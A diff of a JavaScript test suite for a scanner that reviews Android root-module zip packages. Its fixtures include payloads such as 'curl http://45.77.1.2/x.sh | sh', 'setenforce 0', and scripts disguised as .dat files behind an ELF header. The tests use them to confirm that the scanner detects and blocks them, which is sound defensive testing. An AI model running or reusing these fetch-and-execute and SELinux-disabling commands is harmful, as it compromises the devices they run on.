@@ -362,8 +362,9 @@ test('端到端：干净模块（首次收录）判 low 且自动放行', () => 
   assert.equal(r.decision.label, 'auto-approved');
   assert.equal(r.meta.id, 'cool_mod');
   assert.equal(r.inventory.canonicalScripts.length, 2, '应识别两个规范脚本');
-  // ① 脚本全文必须纳入报告
-  assert.match(renderMarkdown(r), /## 脚本全文/);
+  // ① 逐行扫过的文件全文必须纳入报告
+  //（Task 2.7 改了这一节的标题：`cls.others` 里的数据文件也在这节里，叫「脚本全文」就是说假话。）
+  assert.match(renderMarkdown(r), /## 逐行扫过的文件全文/);
   assert.match(renderMarkdown(r), /busybox \$MODPATH/);
 });
 
@@ -461,7 +462,27 @@ test('classify 按规范顺序排列五个脚本，其余归入 otherScripts/oth
   assert.deepEqual(r.inventory.canonicalScripts.map((s) => s.name.split('/').pop()),
     ['customize.sh', 'uninstall.sh', 'action.sh']);
   assert.ok(r.inventory.otherScripts.some((s) => s.name === 'extra/helper.sh'));
-  assert.ok(r.inventory.otherFiles.includes('README.md'));
+  // Task 2.7（fix10-P11）：README.md 是「前 512 字节没有 NUL、又没被前面任何一个桶接住」的可读文本，
+  // 扩面之后它落在 feed 上、被逐行扫过 —— 于是它不再是「未纳入行级扫描的数据文件」。
+  // 断言跟着搬到它真正在的地方。这条用例的原意始终是「每个条目都得在某个清单里有个说法」，
+  // 不是「README.md 必须没被读过」；所以下面既有「它在被扫的那份里」，也有「账要平」。
+  assert.ok(r.scripts.some((s) => s.name === 'README.md'),
+    'README.md 必须在「被逐行扫过的文件」里：' + JSON.stringify(r.scripts.map((s) => s.name)));
+  assert.ok(!r.inventory.otherFiles.includes('README.md'),
+    '已经被内容扫描的条目不许再算进「未纳入行级扫描的数据文件」：' + JSON.stringify(r.inventory.otherFiles));
+  const accounted = new Set([
+    ...r.scripts.map((s) => s.name),
+    ...r.binaries.map((b) => b.name),
+    ...r.inventory.otherFiles,
+  ]);
+  assert.equal(accounted.size, r.inventory.totalEntries,
+    `账要平：${r.inventory.totalEntries} 个条目只对得上 ${accounted.size} 个说法（被逐行扫过 / 登记为二进制 / `
+    + `写进「没读过」清单），剩下的条目报告既没读也没说：`
+    + JSON.stringify({
+      scripts: r.scripts.map((s) => s.name),
+      binaries: r.binaries.map((b) => b.name),
+      otherFiles: r.inventory.otherFiles,
+    }));
 });
 
 test('缺少 module.prop 的 zip 报 META_PROP_MISSING 且不低于 medium', () => {
@@ -853,20 +874,34 @@ test('T2.9：没超限的条目一个字节都不许多记 —— 上限不产�
 });
 
 test('T2.9 方向②续：被引用升级进来的大条目同样受上限约束，且记账指到那个条目', () => {
-  // 载荷不在脚本桶里（改名 .dat），由 service.sh 引用它而升级进扫描面 ——
-  // 升级进来的条目要是绕开上限，P11 扩面之后这条就是漏口。
-  const payload = pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500);
+  // Task 2.7（fix10-P11）改了这里的前提：改名成 .dat 的**文本**载荷现在本来就在 feed 上
+  // （cls.others 进内容扫描），不再「因引用被拉进来」，于是它不再是这条用例的对象。
+  // 升级条目要真有，载荷就得在 feed 之外 —— 换成「魔数头伪装成 .dat」：classify 把它路由到
+  // binaries（那条魔数优先于后缀的分流由本文件的伪装钉子压着），它只能靠 service.sh 的引用进来，
+  // 上限与截断记账才有对象可管。夹具尺寸不变（同一个 pad29 形状，仍然远超上限）。
+  const payload = elfWith(pad29(LINES_BEFORE29 + 1) + 'setenforce 0\n' + pad29(1500));
   const p = writeZip('cap-escalated.zip', [
     { name: 'module.prop', content: CLEAN_PROP },
     { name: 'service.sh', content: '#!/system/bin/sh\nsh /data/adb/modules/cool_mod/stage.dat\n' },
     { name: 'stage.dat', content: payload },
   ]);
   const r = scanZip(p, { declaredId: 'cool_mod', declaredVersion: 'v1.0', changeType: 'first' });
+  assert.equal(payload.length > CAP29, true, `夹具必须超过上限（实际 ${payload.length} / ${CAP29}）`);
+  assert.ok(r.binaries.some((b) => b.name === 'stage.dat'),
+    '夹具前提：它走 binaries，不在 feed 上，只能被引用拉进来：' + JSON.stringify(r.binaries));
   assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['stage.dat'], '夹具前提：stage.dat 被升级进扫描面');
   assert.ok(!r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE'), '上限之后的载荷不该被读到（上限生效）');
   const cov = r.findings.find((f) => f.ruleId === 'AUDIT_COVERAGE_TRUNCATED' && f.file === 'stage.dat');
   assert.ok(cov, '升级进来的条目超限也必须记账', JSON.stringify(r.findings.map((f) => f.ruleId)));
   assert.equal(SEVERITY_ORDER[cov.severity] >= SEVERITY_ORDER.medium, true);
+  assert.match(cov.snippet, new RegExp(String(payload.length)), '记账要写出条目原大小');
+  assert.match(cov.message, new RegExp(String(CAP29)), '记账要写出实扫字节数（上限）');
+  // 记账不能只落在 finding 上：清单里那一行要同时给出「多大」和「实扫多少」，人才复核得了。
+  const row = r.inventory.escalated.find((e) => e.name === 'stage.dat');
+  assert.ok(row, '升级条目要在文件清单里（评审 F11）');
+  assert.equal(row.bytes, payload.length, '清单行的原大小就是条目字节数');
+  assert.equal(row.scanBytes, CAP29, `实扫字节必须正好砍在上限上，实际 ${row.scanBytes}`);
+  assert.equal(row.scanCapped, true, '被上限砍过就要标成截断，不许安静');
   assert.notEqual(r.decision.action, 'auto-approve');
   assert.notEqual(r.riskLevel, 'low');
 });
@@ -1154,25 +1189,51 @@ test('端到端：引用的路径不在包内时不升级，但引用行本身�
 });
 
 test('端到端：升级链路在报告里看得见（escalated + inventory + Markdown 引用链）', async () => {
-  const zip = makeModuleZip({ id: 'eval.t1d', files: [
+  // —— (a) 真升级那一格：载荷在 feed 之外（魔数头伪装成 .dat → binaries 桶），由 service.sh 的引用拉进来。
+  // report.escalated 的语义就应该是这一格：「原本不在扫描面、因引用被拉进来的条目」。
+  const binZip = makeModuleZip({ id: 'eval.t1dbin', files: [
+    ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1dbin/stage.dat\n'],
+    ['stage.dat', elfWith('setenforce 0\n')],
+  ]});
+  const rb = await scanToReport(binZip, { changeType: 'first' });
+  assert.deepEqual(rb.escalated, [
+    { fromFile: 'service.sh', fromLine: 2, ref: 'sh /data/adb/modules/eval.t1dbin/stage.dat', resolvedEntry: 'stage.dat' },
+  ]);
+  assert.deepEqual(rb.inventory.escalated.map((e) => [e.name, e.fromFile, e.fromLine]), [['stage.dat', 'service.sh', 2]]);
+  // 升级过的条目不再出现在「未纳入行级扫描的数据文件」里 —— 它已经被扫了
+  assert.ok(!rb.inventory.otherFiles.includes('stage.dat'), JSON.stringify(rb.inventory.otherFiles));
+  const mdb = renderMarkdown(rb);
+  assert.match(mdb, /被脚本引用而\*\*升级进扫描面\*\*的条目/);
+  assert.match(mdb, /stage\.dat/);
+  assert.ok(mdb.includes('| 被引用升级（原本不在扫描面） | `stage.dat` |'), '文件清单表里也要有它一行');
+  assert.match(mdb, /`service\.sh:2`/);
+  assert.ok(rb.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'stage.dat'),
+    '升级不是记账游戏：拉进来之后必须真被逐行读过：' + JSON.stringify(rb.findings.map((f) => f.ruleId)));
+  const jb = JSON.parse(renderJSON(rb));
+  assert.deepEqual(jb.escalated, rb.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');
+
+  // —— (b) P11 那一格：载荷是名单外的**可读文本**，本来就在 feed 上，所以没有升级证人。
+  // 少掉的只有「它曾被拉进来」这句记账，读到的东西一个字都没少：全文进了「逐行扫过的文件全文」，
+  // 载荷内容自己出了 finding，引用方也仍然被 EXEC_BUNDLED_FILE/high 指名（covered 判在扩面之前的面）。
+  const r = await scanToReport(makeModuleZip({ id: 'eval.t1d', files: [
     ['service.sh', '#!/system/bin/sh\nsh /data/adb/modules/eval.t1d/stage.dat\n'],
     ['stage.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
-  ]});
-  const r = await scanToReport(zip, { changeType: 'first' });
-  assert.deepEqual(r.escalated, [
-    { fromFile: 'service.sh', fromLine: 2, ref: 'sh /data/adb/modules/eval.t1d/stage.dat', resolvedEntry: 'stage.dat' },
-  ]);
-  assert.deepEqual(r.inventory.escalated.map((e) => [e.name, e.fromFile, e.fromLine]), [['stage.dat', 'service.sh', 2]]);
-  // 升级过的条目不再出现在「未纳入行级扫描的数据文件」里 —— 它已经被扫了
+  ]}), { changeType: 'first' });
+  assert.deepEqual(r.escalated, [],
+    'stage.dat 已经在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
+  assert.deepEqual(r.inventory.escalated, [], '清单里的升级行同理，不许凭空多一笔');
   assert.ok(!r.inventory.otherFiles.includes('stage.dat'), JSON.stringify(r.inventory.otherFiles));
+  assert.ok(r.scripts.some((s) => s.name === 'stage.dat'),
+    '载荷必须在被逐行扫过的文件里：' + JSON.stringify(r.scripts.map((s) => s.name)));
   const md = renderMarkdown(r);
-  assert.match(md, /被脚本引用而\*\*升级进扫描面\*\*的条目/);
-  assert.match(md, /stage\.dat/);
-  assert.ok(md.includes('| 被引用升级（原本不在扫描面） | `stage.dat` |'), '文件清单表里也要有它一行');
-  assert.match(md, /`service\.sh:2`/);
-  assert.match(md, /## 脚本全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
-  const j = JSON.parse(renderJSON(r));
-  assert.deepEqual(j.escalated, r.escalated, 'escalated 是报告字段，不是 finding，JSON 里原样保留');
+  assert.match(md, /## 逐行扫过的文件全文[\s\S]*curl http:\/\/45\.77\.1\.2\/x\.sh \| sh/);
+  assert.ok(r.findings.some((f) => f.ruleId === 'PIPE_TO_SHELL' && f.file === 'stage.dat' && f.severity === 'high'),
+    '载荷的内容必须真被读到并出发现：' + JSON.stringify(r.findings.map((f) => `${f.ruleId}/${f.severity}`)));
+  const eb = r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE');
+  assert.equal(eb && eb.severity, 'high',
+    '作证的角色落在 EXEC_BUNDLED_FILE 自己身上：它必须还在、还是 high');
+  assert.equal(r.riskLevel, 'high');
+  assert.equal(r.decision.action, 'block');
 });
 
 /** ELF 头 + 埋一行明文给行级规则读 + 补零：魔数是机器码，名字随用例挑 */
@@ -1233,12 +1294,22 @@ test('fix1-②：同一行不许自我豁免 —— 两个引用一个合法一�
     ]});
     const r = await scanToReport(zip, { changeType: 'first' });
     const ids = r.findings.map((f) => f.ruleId);
-    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['payload.dat'], ref);
+    // Task 2.7（fix10-P11）：payload.dat 是名单外的可读文本，现在本来就在 feed 上 —— 它不再「被拉进来」，
+    // 所以 escalated 空是正确结果。这条用例的证人换了落点：载荷自己的 PIPE_TO_SHELL/high 与引用方的
+    // EXEC_BUNDLED_FILE/high 都还在（covered 判在扩面之前的五个桶上，撤销不成立）。
+    assert.deepEqual(r.escalated, [], ref + ' —— payload.dat 已在 feed 上，不许再记一笔升级证人');
+    assert.ok(r.scripts.some((s) => s.name === 'payload.dat'),
+      ref + ' —— 载荷必须被逐行扫过：' + JSON.stringify(r.scripts.map((s) => s.name)));
     assert.ok(ids.includes('EXEC_BUNDLED_FILE'), ref);
     assert.ok(ids.includes('PIPE_TO_SHELL'), '载荷必须按文本再扫一遍');
     assert.equal(r.findings.find((f) => f.ruleId === 'PIPE_TO_SHELL').file, 'payload.dat');
     assert.equal(r.riskLevel, 'high', ref + ' —— 评审实测曾是 0 命中 / low');
-    // install.sh 已被逐行扫过，不该由它说话：snippet 要指向真正没被扫过的载荷
+    // install.sh 已被逐行扫过，不该由它说话：snippet 要指向真正没被扫过的载荷。
+    // ↓ 这一条在本轮**保持红**，等一个代码侧决定，不许靠改断言变绿（详见 task-2.7-report.md 的停手项）：
+    //   applyBundledRefVerdicts 的 `cause` 只认「被升级的 > 钉不住的 > 解析不到的」三种落点，
+    //   P11 之后载荷已在 feed 上、没有升级条目 ⇒ cause 为空 ⇒ snippet 退回规则自己的最左匹配，
+    //   于是第二种写法（良性引用在最左）把报告指到了 install.sh 上。判据、等级、结论都没松，
+    //   松的是「谁为这条 high 作证」的指向。
     assert.match(r.findings.find((f) => f.ruleId === 'EXEC_BUNDLED_FILE').snippet, /payload\.dat/);
   }
 });
@@ -1282,7 +1353,7 @@ test('fix1-③：围栏体里的反引号关不掉公开评论的围栏 —— �
     '注入的假标题被当成报告自己的标题渲染了：' + JSON.stringify(outside.slice(0, 8)));
   // 开栏/闭栏的长度要压过正文里最长的反引号串（这里是 4 个），否则正文的 ``` 能提前闭栏
   const opener = md.match(/^(`{3,})sh$/m);
-  assert.ok(opener, '「脚本全文」一节要有以 sh 标注的开栏');
+  assert.ok(opener, '「逐行扫过的文件全文」一节要有以 sh 标注的开栏');
   assert.ok(opener[1].length > 4,
     '开栏长度必须压过正文里最长的反引号串，实际 ' + opener[1].length + ' 个');
   assert.ok(md.includes('## 已由维护者批准'), '显示层防护不许吃掉原文（人工要看的就是原文）');
@@ -1298,8 +1369,11 @@ test('fix1-④：注释行豁免；echo / source / 单引号 / ${IFS} / 直接�
   assert.ok(!a.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'),
     JSON.stringify(a.findings.map((f) => f.ruleId)));
   assert.equal(a.riskLevel, 'low', JSON.stringify(a.findings));
-  assert.deepEqual(a.escalated.map((e) => e.resolvedEntry), ['notes.dat'],
-    '豁免只作用于「报不报」；被引用的条目照样进扫描面，别把注释当免检通道');
+  // Task 2.7（fix10-P11）：notes.dat 是名单外的可读文本，本来就在 feed 上，不再有升级证人。
+  // 「豁免只作用于报不报、被引用的条目照样要读」这条主张换到它真正的落点上：它在被逐行扫过的那份里。
+  assert.ok(a.scripts.some((s) => s.name === 'notes.dat'),
+    '注释行豁免不许让 notes.dat 免检：它必须被逐行扫过 —— ' + JSON.stringify(a.scripts.map((s) => s.name)));
+  assert.deepEqual(a.escalated, [], 'notes.dat 已在 feed 上：不许为它记一笔没发生过的升级');
 
   for (const [line, want] of [
     ['echo hi sh $MODDIR/x.dat', 'x.dat'],
@@ -1315,7 +1389,10 @@ test('fix1-④：注释行豁免；echo / source / 单引号 / ${IFS} / 直接�
     ]});
     const r = await scanToReport(zip, { changeType: 'first' });
     assert.ok(r.findings.some((f) => f.ruleId === 'EXEC_BUNDLED_FILE'), line + ' 必须报');
-    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [want], line + ' 必须升级 ' + want);
+    // Task 2.7（fix10-P11）：这些载荷都是可读文本，本来就在 feed 上 → 没有升级证人，但必须真被读过。
+    assert.ok(r.scripts.some((s) => s.name === want),
+      line + ' 必须把 ' + want + ' 读掉：' + JSON.stringify(r.scripts.map((s) => s.name)));
+    assert.deepEqual(r.escalated, [], line + ' —— ' + want + ' 已在 feed 上，不许记没发生过的升级');
     assert.equal(r.riskLevel, 'high', line);
   }
 });
@@ -1340,7 +1417,12 @@ test('fix1-⑤：归一化覆盖 //、..、.、反斜杠、大小写变体', asy
       ['sub/inner.dat', 'setenforce 0\n'],
     ]});
     const r = await scanToReport(zip, { changeType: 'first' });
-    assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), [want], line + ' → ' + want);
+    // Task 2.7（fix10-P11）：归一化指向的 .dat 现在本来就在 feed 上，所以没有升级证人；
+    // 「归一化之后要真的把那个条目读了」这条主张由下面 SELINUX_DISABLE 那句钉着，一件没少。
+    assert.ok(r.scripts.some((s) => s.name === want),
+      line + ' 归一化后的 ' + want + ' 必须在被逐行扫过的文件里：'
+      + JSON.stringify(r.scripts.map((s) => s.name)));
+    assert.deepEqual(r.escalated, [], line + ' —— ' + want + ' 已在 feed 上，不许记没发生过的升级');
     const f = r.findings.find((x) => x.ruleId === 'EXEC_BUNDLED_FILE');
     assert.equal(f.advice, EXEC_BUNDLED_FILE.advice, '解析到并读过了，才允许保留「读一遍」那句承诺');
     assert.ok(r.findings.some((x) => x.ruleId === 'SELINUX_DISABLE' && x.file === want),
@@ -1365,36 +1447,76 @@ test('fix1-⑤：归一化后仍解析不到时，报告不许承诺它没做到
 });
 
 test('fix1-⑥：同一载荷被多种写法引用只升级一次；同名不同内容的重复条目全都要扫', async () => {
-  const once = makeModuleZip({ id: 'eval.h6a', files: [
-    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/payload.dat\nsh $MODDIR//payload.dat\nbash ${MODDIR}/payload.dat\n'],
-    ['payload.dat', 'echo one\n'],
-  ]});
-  const a = await scanToReport(once, { changeType: 'first' });
-  assert.equal(a.escalated.length, 1, '三种写法指向同一份内容，扫描面里只能有一份');
-  assert.equal(a.scripts.filter((s) => s.name === 'payload.dat').length, 1);
-  assert.equal(a.inventory.escalated.length, 1);
+  // Task 2.7（fix10-P11）把「升级证人」和「读没读」分成了两格：
+  //   * 可读文本载荷（.dat）现在本来就在 feed 上 → escalated 必须是空，去重要看 scripts 里出现几行；
+  //   * feed 之外的载荷（魔数头伪装成 .dat → binaries）仍然只能靠引用被拉进来 → 原来那三条去重
+  //     断言一字不动地钉在它身上。
+  // 两格都跑，是因为这条用例真正要钉的是「同一个内容只进扫描面一次 / 不同内容都要进」，
+  // 而不是「escalated 里必须有东西」。
+  const REF3 = '#!/system/bin/sh\nsh $MODDIR/payload.dat\nsh $MODDIR//payload.dat\nbash ${MODDIR}/payload.dat\n';
 
-  // 同名重复条目：两份内容都得进扫描面，否则「放两份同名、审核读干净那份」正是这条闸要拦的手法
-  const dup = makeModuleZip({ id: 'eval.h6b', files: [
+  // —— (a) 可读文本：三种写法指向同一份内容，feed 里只能有一份
+  const a = await scanToReport(makeModuleZip({ id: 'eval.h6a', files: [
+    ['service.sh', REF3],
+    ['payload.dat', 'echo one\n'],
+  ]}), { changeType: 'first' });
+  assert.deepEqual(a.escalated, [], 'payload.dat 已在 feed 上：不许记一笔没发生过的升级');
+  assert.equal(a.scripts.filter((s) => s.name === 'payload.dat').length, 1,
+    '三种写法指向同一份内容，被逐行扫过的清单里只能有一行：'
+    + JSON.stringify(a.scripts.map((s) => s.name)));
+
+  // —— (a-bin) 同形状，载荷换成 feed 之外的二进制：原三条升级断言一字不动
+  const ab = await scanToReport(makeModuleZip({ id: 'eval.h6abin', files: [
+    ['service.sh', REF3],
+    ['payload.dat', elfWith('echo one\n')],
+  ]}), { changeType: 'first' });
+  assert.equal(ab.escalated.length, 1, '三种写法指向同一份内容，扫描面里只能有一份');
+  assert.equal(ab.scripts.filter((s) => s.name === 'payload.dat').length, 1);
+  assert.equal(ab.inventory.escalated.length, 1);
+
+  // —— (b) 同名不同内容的文本重复：两份都得被读到，否则「放两份同名、审核读干净那份」就成立了
+  const b = await scanToReport(makeModuleZip({ id: 'eval.h6b', files: [
     ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
     ['dup.dat', 'setenforce 0\n'],
     ['dup.dat', 'curl http://45.77.1.2/x.sh | sh\n'],
-  ]});
-  const b = await scanToReport(dup, { changeType: 'first' });
-  assert.deepEqual(b.escalated.map((e) => e.resolvedEntry), ['dup.dat', 'dup.dat'],
-    '同名不同内容的两份都要升级；去重只去「内容相同」的那一类');
+  ]}), { changeType: 'first' });
+  assert.equal(b.scripts.filter((s) => s.name === 'dup.dat').length, 2,
+    '同名不同内容的两份都要被逐行扫过：' + JSON.stringify(b.scripts.map((s) => s.name)));
+  assert.deepEqual(b.escalated, [], '两份都已在 feed 上：没有升级证人，但两条内容都读到了');
   const ids = b.findings.map((f) => f.ruleId);
   assert.ok(ids.includes('SELINUX_DISABLE') && ids.includes('PIPE_TO_SHELL'), ids.join(','));
   assert.ok(ids.includes('STRUCT_DUPLICATE_NAME'), ids.join(','));
 
-  // 内容完全相同的重复条目只扫一遍，别把产物灌两遍
-  const same = makeModuleZip({ id: 'eval.h6c', files: [
+  // —— (b-bin) 同形状换成 feed 之外：原「两份都要升级」的断言一字不动
+  const bb = await scanToReport(makeModuleZip({ id: 'eval.h6bbin', files: [
+    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/dup.dat\n'],
+    ['dup.dat', elfWith('setenforce 0\n')],
+    ['dup.dat', elfWith('curl http://45.77.1.2/x.sh | sh\n')],
+  ]}), { changeType: 'first' });
+  assert.deepEqual(bb.escalated.map((e) => e.resolvedEntry), ['dup.dat', 'dup.dat'],
+    '同名不同内容的两份都要升级；去重只去「内容相同」的那一类');
+
+  // —— (c) 同名同内容的文本重复：扩面之后两份都在 feed 上（比 BASE 多读了一遍，不松），
+  // 「同内容只算一份」的去重由 feed 之外的 (c-bin) 钉住。
+  const c = await scanToReport(makeModuleZip({ id: 'eval.h6c', files: [
     ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
     ['same.dat', 'echo same\n'],
     ['same.dat', 'echo same\n'],
-  ]});
-  const c = await scanToReport(same, { changeType: 'first' });
-  assert.equal(c.escalated.length, 1, '同名的两份同内容条目算一份，扫描面里不许出现两遍');
+  ]}), { changeType: 'first' });
+  assert.equal(c.scripts.filter((s) => s.name === 'same.dat').length, 2,
+    '同名同内容的可读文本现在两份都进 feed（BASE 上一份都没读，只有引用时才升级一份）：'
+    + JSON.stringify(c.scripts.map((s) => s.name)));
+  assert.deepEqual(c.escalated, [], '它们本来就在 feed 上：escalated 里不许出现');
+
+  // —— (c-bin) 内容完全相同的重复条目只扫一遍，别把产物灌两遍
+  const cb = await scanToReport(makeModuleZip({ id: 'eval.h6cbin', files: [
+    ['service.sh', '#!/system/bin/sh\nsh $MODDIR/same.dat\nsh $MODDIR//same.dat\n'],
+    ['same.dat', elfWith('echo same\n')],
+    ['same.dat', elfWith('echo same\n')],
+  ]}), { changeType: 'first' });
+  assert.equal(cb.escalated.length, 1, '同名的两份同内容条目算一份，扫描面里不许出现两遍');
+  assert.equal(cb.scripts.filter((s) => s.name === 'same.dat').length, 1,
+    '同上：被逐行扫过的清单里也只许一行：' + JSON.stringify(cb.scripts.map((s) => s.name)));
 });
 
 test('fixtures：干净模块带 changeType: first 仍可自动放行，不带 opts 则不可达（F15）', async () => {
@@ -1781,10 +1903,13 @@ test('fix2-P2：钉得住的变量按包内条目解析升级；钉不住的按�
     ['payload.bin', 'setenforce 0\n'],
   ] });
   const a = await scanToReport(pinnedZip, { changeType: 'first' });
-  assert.deepEqual(a.escalated.map((e) => e.resolvedEntry), ['payload.bin'],
-    '钉得住的变量要解析成包内条目并升级（旧行为实测：0 findings → low → auto-approve）');
+  // Task 2.7（fix10-P11）：payload.bin 是可读文本，本来就在 feed 上，所以 escalated 空；
+  // 「钉得住的变量要解析成包内条目并把它读掉」这条主张由 SELINUX_DISABLE + high + block 钉着。
+  assert.ok(a.scripts.some((s) => s.name === 'payload.bin'),
+    '变量钉到的条目必须在被逐行扫过的文件里：' + JSON.stringify(a.scripts.map((s) => s.name)));
+  assert.deepEqual(a.escalated, [], 'payload.bin 已在 feed 上：不许记一笔没发生过的升级');
   assert.ok(a.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'payload.bin'),
-    '升级之后必须真扫：' + JSON.stringify(a.findings.map((f) => f.ruleId)));
+    '读到了就要真扫：' + JSON.stringify(a.findings.map((f) => f.ruleId)));
   assert.equal(a.riskLevel, 'high');
   assert.equal(a.decision.action, 'block');
 
@@ -2662,9 +2787,12 @@ test('fix5-F1 端到端：清理清单不再送 high，真 source 照旧，被�
   assert.deepEqual(eb.map((f) => f.line), [5],
     `清单那两行（3、4）不许报，真 source 那行（5）照报：${JSON.stringify(eb.map((f) => `${f.line}[${f.snippet}]`))}`);
   assert.equal(eb[0].severity, 'high', '真 source 那行仍是 high');
-  // 豁免只作用于报不报：清单行引用的 system/placeholder 照样被拉进扫描面并逐行读过
-  assert.deepEqual(r.escalated.map((e) => e.resolvedEntry), ['system/placeholder'],
-    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.escalated)}`);
+  // 豁免只作用于报不报：清单行引用的 system/placeholder 照样被读掉。
+  // Task 2.7（fix10-P11）：它是可读文本，本来就在 feed 上 → 没有升级证人，但内容确实逐行扫过。
+  assert.ok(r.scripts.some((s) => s.name === 'system/placeholder'),
+    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
+  assert.deepEqual(r.escalated, [],
+    'system/placeholder 已在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
   assert.ok(r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
     `被引用的载荷必须真的被读过：${JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`))}`);
   assert.equal(r.riskLevel, 'high', '整包定级不因为这 FP 撤掉而变松');
@@ -2909,9 +3037,13 @@ test('fix6-F1 端到端：`rm -rf` 续行的清单沉默，紧随其后的同形
   assert.deepEqual(eb.map((f) => f.line), [5],
     `第 3、4 行是 rm 的参数表（不许报），第 5 行是攻击者挑的形状（必须报）：${JSON.stringify(eb.map((f) => `${f.line}:${f.snippet}`))}`);
   assert.equal(eb[0].severity, 'high', `第 5 行在跑随包提交的文件：${JSON.stringify(eb[0])}`);
-  // 豁免只作用于「报不报」：被引用的条目照样被拉进扫描面并逐行读过
-  assert.ok(r.escalated.map((e) => e.resolvedEntry).includes('system/placeholder'),
-    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.escalated)}`);
+  // 豁免只作用于「报不报」：被引用的条目照样被读掉。
+  // Task 2.7（fix10-P11）：system/placeholder 是可读文本、本来就在 feed 上 → 没有升级证人，
+  // 但「扫描面不许因为这条豁免而缩小」由它在被逐行扫过的清单里这一句钉住。
+  assert.ok(r.scripts.some((s) => s.name === 'system/placeholder'),
+    `扫描面不许因为这条豁免而缩小：${JSON.stringify(r.scripts.map((s) => s.name))}`);
+  assert.deepEqual(r.escalated, [],
+    'system/placeholder 已在 feed 上：escalated 只记「原本不在扫描面」的条目，不许为它作伪证');
   assert.ok(r.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'system/placeholder'),
     `被引用的载荷必须真的被读过：${JSON.stringify(r.findings.map((f) => `${f.ruleId}@${f.file}:${f.line}`))}`);
   assert.equal(r.riskLevel, 'high', '整包定级不因为这 FP 撤掉而变松');
@@ -2947,6 +3079,9 @@ test('fix6-F1：豁免不许把「上一行的动词」当成免检通行证传�
 //          已回退：扩面之后 `sh $MODDIR/payload.dat` 那条 EXEC_BUNDLED_FILE/high 会被「目标已在扫描面
 //          ⇒ 引用不需要单独发现」的撤销判据撤掉，整包从 high/block 掉到 low/auto-approve。
 //          P15 单独上今天什么都不改变（`LICENSE` 不在扫描面里），所以本轮只落 P15。
+//          —— 以上是第 7 轮的记录，原文照留。Task 2.7（fix10-P11）按它当时的结论把「撤销判据」拆出来
+//          之后重做了扩面：feed（谁被扫）与 covered（能不能撤）不再是同一个集合，那一行现在在
+//          `scan.mjs` 里，下面那颗反撤销钉跟着改成钉新的真话。
 //
 // 已知限度（如实钉在下面第 3 条里，不当成已解决）：行中且一行多类型不带花括号
 // （`x=1; permissive su_t magisk_t;`）本轮起不再命中；`/* permissive layout; */` 这种
@@ -2994,11 +3129,14 @@ test('P15 已知限度（如实钉住，不许日后当「顺手简化」把它�
 // 反 P11 撤销钉：扩扫描面不许把「目标已在扫描面 ⇒ 这条引用不需要单独发现」变成全哑
 // ---------------------------------------------------------------------------
 // 扩扫描面必须同时收缩 covered 集 —— 见 Task 2.7（扩扫描面必须带 covered 集收缩）。
-// 钉两件事：(a) `others` 今天不在扫描面上（那条洞还开着，钉住现状不等于认可现状）；
-// (b) 载荷名字像数据、内容无规则命中时，那条 EXEC_BUNDLED_FILE/high 与它的 escalated 证人必须还在。
+// Task 2.7（fix10-P11）落地后，这颗钉子跟着改成钉新的真话，两件东西不许跟着松：
+// (a) `others` 现在**在**扫描面上（BASE 实测：那一格 0 条发现 / low / auto-approve，本轮闭掉）；
+// (b) 载荷名字像数据、内容无规则命中时，那条 EXEC_BUNDLED_FILE/high 仍然不许被撤销 ——
+//     证人是 finding 自己（载荷已在 feed 上，所以 escalated 为空是正确结果，不是证人丢了）。
 
-test('反 P11 撤销钉：名单外文本今天不进扫描面，且扩面撤销不掉 EXEC_BUNDLED_FILE/high', () => {
-  // (a) 今天的真行为：`stage.dat` 里那行 `setenforce 0` 没有被逐行扫过。
+test('反 P11 撤销钉：名单外文本已被扩面读掉，且读掉它撤销不掉 EXEC_BUNDLED_FILE/high', () => {
+  // (a) 现在的真行为：`stage.dat` 里那行 `setenforce 0` 被逐行扫过了 —— Task 2.7 补的就是这一格。
+  //     BASE（`75b76ca`）实测：这个包 0 条发现 / low / auto-approve（引用方与载荷都不像脚本，谁也没读过）。
   const silent = scanZip(makeModuleZip({
     id: 'eval.p11silent',
     files: [
@@ -3007,8 +3145,13 @@ test('反 P11 撤销钉：名单外文本今天不进扫描面，且扩面撤销
       ['stage.dat', 'setenforce 0\n'],
     ],
   }), {});
-  assert.equal(silent.findings.filter((f) => f.file === 'stage.dat').length, 0,
-    'stage.dat 不在扫描面上：这是 Task 2.7 要补的洞，不许把它写成已修');
+  assert.ok(silent.findings.some((f) => f.ruleId === 'SELINUX_DISABLE' && f.file === 'stage.dat'
+    && f.severity === 'high'),
+    'stage.dat 现在在扫描面上，`setenforce 0` 必须被逐行读出来（Task 2.7 已闭，不是待补的洞）：'
+    + JSON.stringify(silent.findings.map((f) => `${f.ruleId}/${f.severity}@${f.file}:${f.line}`)));
+  assert.ok(silent.scripts.some((s) => s.name === 'stage.dat'),
+    '它必须在被逐行扫过的文件里：' + JSON.stringify(silent.scripts.map((s) => s.name)));
+  assert.equal(silent.riskLevel, 'high', '名单外文本里的载荷不能再安静地留在 low');
 
